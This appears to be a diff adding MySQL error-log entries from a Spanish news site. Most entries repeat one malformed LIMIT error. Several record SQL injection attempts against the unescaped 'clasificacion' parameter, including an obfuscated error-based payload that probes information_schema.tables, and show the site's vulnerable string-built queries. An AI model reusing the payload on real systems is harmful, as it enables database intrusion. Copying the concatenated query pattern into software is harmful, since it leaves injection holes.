+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '13999992.3,7' at line 1
+Raw SQL : SELECT * FROM noticias WHERE clasificacion = 'espectaculos' ORDER BY date DESC LIMIT 13999992.3,7
+
+Time : 11:49:48
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '13999992.3,7' at line 1
+Raw SQL : SELECT * FROM noticias WHERE clasificacion = 'espectaculos' ORDER BY date DESC LIMIT 13999992.3,7
+
+Time : 11:49:47
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '13999992.3,7' at line 1
+Raw SQL : SELECT * FROM noticias WHERE clasificacion = 'espectaculos' ORDER BY date DESC LIMIT 13999992.3,7
+
+Time : 11:49:46
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '13999992.3,7' at line 1
+Raw SQL : SELECT * FROM noticias WHERE clasificacion = 'espectaculos' ORDER BY date DESC LIMIT 13999992.3,7
+
+Time : 11:49:46
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '13999992.3,7' at line 1
+Raw SQL : SELECT * FROM noticias WHERE clasificacion = 'espectaculos' ORDER BY date DESC LIMIT 13999992.3,7
+
+Time : 11:49:45
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '13999992.3,7' at line 1
+Raw SQL : SELECT * FROM noticias WHERE clasificacion = 'espectaculos' ORDER BY date DESC LIMIT 13999992.3,7
+
+Time : 11:49:45
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '13999992.3,7' at line 1
+Raw SQL : SELECT * FROM noticias WHERE clasificacion = 'espectaculos' ORDER BY date DESC LIMIT 13999992.3,7
+
+Time : 11:49:44
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '13999992.3,7' at line 1
+Raw SQL : SELECT * FROM noticias WHERE clasificacion = 'espectaculos' ORDER BY date DESC LIMIT 13999992.3,7
+
+Time : 11:49:44
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '13999992.3,7' at line 1
+Raw SQL : SELECT * FROM noticias WHERE clasificacion = 'espectaculos' ORDER BY date DESC LIMIT 13999992.3,7
+
+Time : 11:49:43
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '13999992.3,7' at line 1
+Raw SQL : SELECT * FROM noticias WHERE clasificacion = 'espectaculos' ORDER BY date DESC LIMIT 13999992.3,7
+
+Time : 11:49:43
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '13999992.3,7' at line 1
+Raw SQL : SELECT * FROM noticias WHERE clasificacion = 'espectaculos' ORDER BY date DESC LIMIT 13999992.3,7
+
+Time : 11:49:42
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '13999992.3,7' at line 1
+Raw SQL : SELECT * FROM noticias WHERE clasificacion = 'espectaculos' ORDER BY date DESC LIMIT 13999992.3,7
+
+Time : 11:49:42
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '13999992.3,7' at line 1
+Raw SQL : SELECT * FROM noticias WHERE clasificacion = 'espectaculos' ORDER BY date DESC LIMIT 13999992.3,7
+
+Time : 11:49:41
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '13999992.3,7' at line 1
+Raw SQL : SELECT * FROM noticias WHERE clasificacion = 'espectaculos' ORDER BY date DESC LIMIT 13999992.3,7
+
+Time : 11:49:41
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '13999992.3,7' at line 1
+Raw SQL : SELECT * FROM noticias WHERE clasificacion = 'espectaculos' ORDER BY date DESC LIMIT 13999992.3,7
+
+Time : 11:49:40
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '13999992.3,7' at line 1
+Raw SQL : SELECT * FROM noticias WHERE clasificacion = 'espectaculos' ORDER BY date DESC LIMIT 13999992.3,7
+
+Time : 11:49:40
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '13999992.3,7' at line 1
+Raw SQL : SELECT * FROM noticias WHERE clasificacion = 'espectaculos' ORDER BY date DESC LIMIT 13999992.3,7
+
+Time : 11:49:39
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '13999992.3,7' at line 1
+Raw SQL : SELECT * FROM noticias WHERE clasificacion = 'espectaculos' ORDER BY date DESC LIMIT 13999992.3,7
+
+Time : 11:49:39
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '13999992.3,7' at line 1
+Raw SQL : SELECT * FROM noticias WHERE clasificacion = 'espectaculos' ORDER BY date DESC LIMIT 13999992.3,7
+
+Time : 11:49:38
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '13999992.3,7' at line 1
+Raw SQL : SELECT * FROM noticias WHERE clasificacion = 'espectaculos' ORDER BY date DESC LIMIT 13999992.3,7
+
+Time : 11:49:38
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '13999992.3,7' at line 1
+Raw SQL : SELECT * FROM noticias WHERE clasificacion = 'espectaculos' ORDER BY date DESC LIMIT 13999992.3,7
+
+Time : 11:49:37
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '13999992.3,7' at line 1
+Raw SQL : SELECT * FROM noticias WHERE clasificacion = 'espectaculos' ORDER BY date DESC LIMIT 13999992.3,7
+
+Time : 11:49:37
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '13999992.3,7' at line 1
+Raw SQL : SELECT * FROM noticias WHERE clasificacion = 'espectaculos' ORDER BY date DESC LIMIT 13999992.3,7
+
+Time : 11:49:36
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '13999992.3,7' at line 1
+Raw SQL : SELECT * FROM noticias WHERE clasificacion = 'espectaculos' ORDER BY date DESC LIMIT 13999992.3,7
+
+Time : 11:49:36
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '13999992.3,7' at line 1
+Raw SQL : SELECT * FROM noticias WHERE clasificacion = 'espectaculos' ORDER BY date DESC LIMIT 13999992.3,7
+
+Time : 11:49:35
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '13999992.3,7' at line 1
+Raw SQL : SELECT * FROM noticias WHERE clasificacion = 'espectaculos' ORDER BY date DESC LIMIT 13999992.3,7
+
+Time : 11:49:35
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '13999992.3,7' at line 1
+Raw SQL : SELECT * FROM noticias WHERE clasificacion = 'espectaculos' ORDER BY date DESC LIMIT 13999992.3,7
+
+Time : 11:49:34
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '0=1' ORDER BY date DESC LIMIT 0,7' at line 1
+Raw SQL : SELECT * FROM noticias WHERE clasificacion = 'espectaculos'0=1' ORDER BY date DESC LIMIT 0,7
+
+Time : 11:48:27
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '0=1' ORDER BY date DESC LIMIT 0,7' at line 1
+Raw SQL : SELECT * FROM noticias WHERE clasificacion = 'espectaculos'0=1' ORDER BY date DESC LIMIT 0,7
+
+Time : 11:48:19
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '(/**//**/sElEcT 1 /**//**/fRoM(/**//**/sElEcT count(*),/**//**/cOnCaT((/**//**/s' at line 1
+Raw SQL : SELECT * FROM noticias WHERE clasificacion = 'espectaculos'(/**//**/sElEcT 1 /**//**/fRoM(/**//**/sElEcT count(*),/**//**/cOnCaT((/**//**/sElEcT(/**//**/sElEcT /**//**/uNhEx(/**//**/hEx(/**//**/cOnCaT(0x3f7e21,0x393631353738343330,0x3f7e21)))) /**//**/fRoM information_schema./**//**/tAbLeS /**//**/lImIt 0,1),floor(rand(0)*2))x /**//**/fRoM information_schema./**//**/tAbLeS /**//**/gRoUp/**/By x)a) and '0'='1--' ORDER BY date DESC LIMIT 0,7
+
+Time : 11:48:17
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '(/**//**/sElEcT 1 /**//**/fRoM(/**//**/sElEcT count(*),/**//**/cOnCaT((/**//**/s' at line 1
+Raw SQL : SELECT * FROM noticias WHERE clasificacion = 'espectaculos'(/**//**/sElEcT 1 /**//**/fRoM(/**//**/sElEcT count(*),/**//**/cOnCaT((/**//**/sElEcT(/**//**/sElEcT /**//**/uNhEx(/**//**/hEx(/**//**/cOnCaT(0x3f7e21,0x393631353738343330,0x3f7e21)))) /**//**/fRoM information_schema./**//**/tAbLeS /**//**/lImIt 0,1),floor(rand(0)*2))x /**//**/fRoM information_schema./**//**/tAbLeS /**//**/gRoUp/**/By x)a) and '0'='1--' ORDER BY date DESC LIMIT 0,7
+
+Time : 11:48:16
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '(/**//**/sElEcT 1 /**//**/fRoM(/**//**/sElEcT count(*),/**//**/cOnCaT((/**//**/s' at line 1
+Raw SQL : SELECT * FROM noticias WHERE clasificacion = 'espectaculos'(/**//**/sElEcT 1 /**//**/fRoM(/**//**/sElEcT count(*),/**//**/cOnCaT((/**//**/sElEcT(/**//**/sElEcT /**//**/uNhEx(/**//**/hEx(/**//**/cOnCaT(0x3f7e21,0x393631353738343330,0x3f7e21)))) /**//**/fRoM information_schema./**//**/tAbLeS /**//**/lImIt 0,1),floor(rand(0)*2))x /**//**/fRoM information_schema./**//**/tAbLeS /**//**/gRoUp/**/By x)a) and '0'='1--' ORDER BY date DESC LIMIT 0,7
+
+Time : 11:48:13
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '(/**//**/sElEcT 1 /**//**/fRoM(/**//**/sElEcT count(*),/**//**/cOnCaT((/**//**/s' at line 1
+Raw SQL : SELECT * FROM noticias WHERE clasificacion = 'espectaculos'(/**//**/sElEcT 1 /**//**/fRoM(/**//**/sElEcT count(*),/**//**/cOnCaT((/**//**/sElEcT(/**//**/sElEcT /**//**/uNhEx(/**//**/hEx(/**//**/cOnCaT(0x3f7e21,0x393631353738343330,0x3f7e21)))) /**//**/fRoM information_schema./**//**/tAbLeS /**//**/lImIt 0,1),floor(rand(0)*2))x /**//**/fRoM information_schema./**//**/tAbLeS /**//**/gRoUp/**/By x)a) '--' ORDER BY date DESC LIMIT 0,7
+
+Time : 11:48:13
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '(/**//**/sElEcT 1 /**//**/fRoM(/**//**/sElEcT count(*),/**//**/cOnCaT((/**//**/s' at line 1
+Raw SQL : SELECT * FROM noticias WHERE clasificacion = 'espectaculos'(/**//**/sElEcT 1 /**//**/fRoM(/**//**/sElEcT count(*),/**//**/cOnCaT((/**//**/sElEcT(/**//**/sElEcT /**//**/uNhEx(/**//**/hEx(/**//**/cOnCaT(0x3f7e21,0x393631353738343330,0x3f7e21)))) /**//**/fRoM information_schema./**//**/tAbLeS /**//**/lImIt 0,1),floor(rand(0)*2))x /**//**/fRoM information_schema./**//**/tAbLeS /**//**/gRoUp/**/By x)a) '--' ORDER BY date DESC LIMIT 0,7
+
+Time : 11:48:12
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '(/**//**/sElEcT 1 /**//**/fRoM(/**//**/sElEcT count(*),/**//**/cOnCaT((/**//**/s' at line 1
+Raw SQL : SELECT * FROM noticias WHERE clasificacion = 'espectaculos'(/**//**/sElEcT 1 /**//**/fRoM(/**//**/sElEcT count(*),/**//**/cOnCaT((/**//**/sElEcT(/**//**/sElEcT /**//**/uNhEx(/**//**/hEx(/**//**/cOnCaT(0x3f7e21,0x393631353738343330,0x3f7e21)))) /**//**/fRoM information_schema./**//**/tAbLeS /**//**/lImIt 0,1),floor(rand(0)*2))x /**//**/fRoM information_schema./**//**/tAbLeS /**//**/gRoUp/**/By x)a) '--' ORDER BY date DESC LIMIT 0,7
+
+Time : 11:47:58
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '0=1' ORDER BY date DESC LIMIT 0,7' at line 1
+Raw SQL : SELECT * FROM noticias WHERE clasificacion = ''0=1' ORDER BY date DESC LIMIT 0,7
+
+Time : 04:33:46
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=
+
+Time : 04:33:46
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=
+
+Time : 03:34:35
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=
